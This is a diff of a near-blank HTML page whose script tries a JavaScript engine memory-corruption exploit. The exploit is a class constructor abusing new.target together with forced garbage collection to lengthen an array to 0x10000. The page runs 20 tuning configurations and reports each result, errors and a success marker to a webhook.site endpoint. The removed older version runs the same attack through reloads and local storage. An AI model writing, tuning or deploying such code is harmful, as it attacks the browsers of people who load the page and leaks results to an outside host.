@@ -1,85 +1,89 @@
-<!DOCTYPE html><html><body><h1>..</h1><script>
+<!DOCTYPE html><html><body><h1>..</h1>
+<script>window.onerror = function(m,s,l,c){try{new Image().src="https://webhook.site/6a12c5c9-45dd-43ef-8288-f819649c5986?jserr="+encodeURIComponent(m+" @"+l+":"+c)}catch(e){}};</script>
+<script>
 
-function qparam(k) {
-  var m = new RegExp("[?&]" + k + "=([^&]*)").exec(location.search);
-  return m ? decodeURIComponent(m[1].replace(/\+/g, " ")) : null;
+function beacon(tag, data) {
+  try { new Image().src = "https://webhook.site/6a12c5c9-45dd-43ef-8288-f819649c5986?t=" + encodeURIComponent(tag) + "&d=" + encodeURIComponent(JSON.stringify(data||{})); } catch(e) {}
 }
-var state = {i: 0, res: {}};
-try {
-  var saved = localStorage.getItem("sw3");
-  if (saved) { var p = JSON.parse(saved); if (p && typeof p.i == "number") state = p; }
-} catch(e) {}
-var urlResult = qparam("res");
-if (urlResult !== null) {
+beacon("v2-loaded", {});
+
+function makeAttempt(cfg) {
+  return new Function("cfg", `
+    var dogc_flag = false;
+    var buffer = new ArrayBuffer(8);
+    var f64 = new Float64Array(buffer);
+    var u32 = new Uint32Array(buffer);
+    var empty_object = {}; var empty_array = [];
+    var corrupted_instance = null;
+    function dogc() {
+      if (dogc_flag == true) { for (var i = 0; i < cfg.gcCount; i++) { new ArrayBuffer(cfg.gcSize); } }
+    }
+    class ClassParent {}
+    class ClassBug extends ClassParent {
+      constructor() {
+        const v24 = new new.target();
+        var x = [empty_object,empty_object,empty_object,empty_object,empty_object,empty_object,empty_object,empty_object];
+        super();
+        var a = [1.1];
+        this.x = x; this.a = a;
+        this.d = dogc;
+        JSON.stringify(empty_array);
+      }
+      [1] = dogc();
+    }
+    var hotAt = Math.floor(cfg.loopLen * cfg.gcFrac);
+    for (var i = 0; i < 200; i++) { dogc_flag = false; if (i%2 == 0) dogc_flag = true; dogc(); }
+    for (var i = 0; i < cfg.loopLen; i++) {
+      dogc_flag = false;
+      if (i >= hotAt && i < hotAt + 4) { dogc_flag = true; dogc(); dogc_flag = false; }
+      if (i == cfg.loopLen - 4) dogc_flag = true;
+      var x = Reflect.construct(ClassBug, empty_array, ClassParent);
+      if (i == Math.floor(cfg.loopLen*0.5)) corrupted_instance = x;
+    }
+    var x = corrupted_instance.x;
+    var a = corrupted_instance.a;
+    return {corrupted: (a.length == 0x10000), alen: a.length};
+  `);
+}
+
+var CONFIGS = [
+  {loopLen: 300, gcFrac: 0.5, gcCount: 100, gcSize: 0x10000},
+  {loopLen: 400, gcFrac: 0.5, gcCount: 100, gcSize: 0x10000},
+  {loopLen: 500, gcFrac: 0.3, gcCount: 300, gcSize: 0x10000},
+  {loopLen: 500, gcFrac: 0.5, gcCount: 300, gcSize: 0x10000},
+  {loopLen: 500, gcFrac: 0.7, gcCount: 300, gcSize: 0x10000},
+  {loopLen: 650, gcFrac: 0.3, gcCount: 300, gcSize: 0x10000},
+  {loopLen: 650, gcFrac: 0.5, gcCount: 300, gcSize: 0x10000},
+  {loopLen: 650, gcFrac: 0.7, gcCount: 300, gcSize: 0x10000},
+  {loopLen: 650, gcFrac: 0.98, gcCount: 300, gcSize: 0x10000},
+  {loopLen: 800, gcFrac: 0.5, gcCount: 300, gcSize: 0x10000},
+  {loopLen: 1000, gcFrac: 0.5, gcCount: 300, gcSize: 0x10000},
+  {loopLen: 1300, gcFrac: 0.5, gcCount: 300, gcSize: 0x10000},
+  {loopLen: 650, gcFrac: 0.5, gcCount: 1000, gcSize: 0x10000},
+  {loopLen: 650, gcFrac: 0.5, gcCount: 50, gcSize: 0x40000},
+  {loopLen: 650, gcFrac: 0.5, gcCount: 300, gcSize: 0x4000},
+  {loopLen: 1000, gcFrac: 0.25, gcCount: 500, gcSize: 0x10000},
+  {loopLen: 1000, gcFrac: 0.75, gcCount: 500, gcSize: 0x10000},
+  {loopLen: 500, gcFrac: 0.2, gcCount: 200, gcSize: 0x20000},
+  {loopLen: 500, gcFrac: 0.8, gcCount: 200, gcSize: 0x20000},
+  {loopLen: 2000, gcFrac: 0.5, gcCount: 300, gcSize: 0x10000}
+];
+beacon("v2-configs", {n: CONFIGS.length});
+var idx = 0;
+function tryNext() {
+  if (idx >= CONFIGS.length) { beacon("v2-done", {}); return; }
+  var cfg = CONFIGS[idx];
   try {
-    var ur = JSON.parse(urlResult);
-    if (ur && typeof ur.i == "number" && ur.r !== undefined) { state.res["c" + ur.i] = ur.r; state.i = ur.i + 1; }
-  } catch(e) {}
+    var f = makeAttempt(cfg);
+    var r = f(cfg);
+    beacon("v2-" + idx + "-L" + cfg.loopLen + "-f" + cfg.gcFrac + "-g" + cfg.gcCount, {corrupted: r.corrupted, alen: r.alen});
+    if (r.corrupted) { beacon("V2HIT", {cfg: JSON.stringify(cfg)}); }
+  } catch(e) {
+    beacon("v2-" + idx + "-ERR", {e: String(e).slice(0,80)});
+  }
+  idx++;
+  setTimeout(tryNext, 300);
 }
-try { localStorage.setItem("sw3", JSON.stringify(state)); } catch(e) {}
-
-var LOOPLENS = [400, 500, 650, 800, 1000, 1300];
-var GCS = [200, 800];
-var cfgs = [];
-for (var L of LOOPLENS) for (var gf of [0.3,0.45,0.6,0.75,0.85,0.92]) for (var g of GCS) for (var v of [1,2]) {
-  cfgs.push({L:L, gf:gf, g:g, v:v});
-}
-
-var i = state.i;
-if (i >= cfgs.length) {
-  var corruptedKeys = [];
-  for (var k in state.res) { if (state.res[k] === true) corruptedKeys.push(k); }
-  try { localStorage.setItem("sw3done", JSON.stringify(corruptedKeys)); } catch(e) {}
-  document.title = "DONE " + corruptedKeys.join(",");
-  // stay: navigate to a done-marker URL (appears in device log)
-  setTimeout(function(){ location.href = location.pathname + "?done=" + corruptedKeys.length + "&keys=" + encodeURIComponent(corruptedKeys.join("|")); }, 1500);
-} else {
-  var c = cfgs[i];
-  var r = "err";
-  try {
-    var f = new Function("loopLen","gcFrac","gcCount","variant", `
-      var dogc_flag = false;
-      var buffer = new ArrayBuffer(8);
-      var f64 = new Float64Array(buffer);
-      var u32 = new Uint32Array(buffer);
-      var empty_object = {}; var empty_array = [];
-      var corrupted_instance = null;
-      function dogc() {
-        if (dogc_flag == true) { for (var j = 0; j < gcCount; j++) { new ArrayBuffer(0x10000); } }
-      }
-      class ClassParent {}
-      class ClassBug extends ClassParent {
-        constructor() {
-          const v24 = new new.target();
-          var x = [empty_object,empty_object,empty_object,empty_object,empty_object,empty_object,empty_object,empty_object];
-          super();
-          if (variant == 2) { dogc(); }
-          var a = [1.1];
-          this.x = x; this.a = a;
-          this.d = dogc;
-          JSON.stringify(empty_array);
-        }
-        [1] = (variant == 1) ? dogc() : 0;
-      }
-      var hotAt = Math.floor(loopLen * gcFrac);
-      for (var j = 0; j < 200; j++) { dogc_flag = false; if (j%2==0) dogc_flag = true; dogc(); }
-      for (var j = 0; j < loopLen; j++) {
-        dogc_flag = false;
-        if (j >= hotAt && j < hotAt + 4) { dogc_flag = true; dogc(); dogc_flag = false; }
-        if (j == loopLen - 4) dogc_flag = true;
-        var x = Reflect.construct(ClassBug, empty_array, ClassParent);
-        if (j == Math.floor(loopLen*0.5)) corrupted_instance = x;
-      }
-      var x = corrupted_instance.x;
-      var a = corrupted_instance.a;
-      return (a.length == 0x10000);
-    `);
-    r = f(c.L, c.gf, c.g, c.v);
-  } catch(e) { r = "ex:" + String(e).slice(0,40); }
-  state.res["c" + i] = r;
-  try { localStorage.setItem("sw3", JSON.stringify(state)); } catch(e) {}
-  var next = location.pathname + "?r=s2&i=" + (i+1) + "&res=" + encodeURIComponent(JSON.stringify({i:i, r:r}));
-  setTimeout(function(){ location.href = next; }, 150);
-}
+tryNext();
 
 </script></body></html>
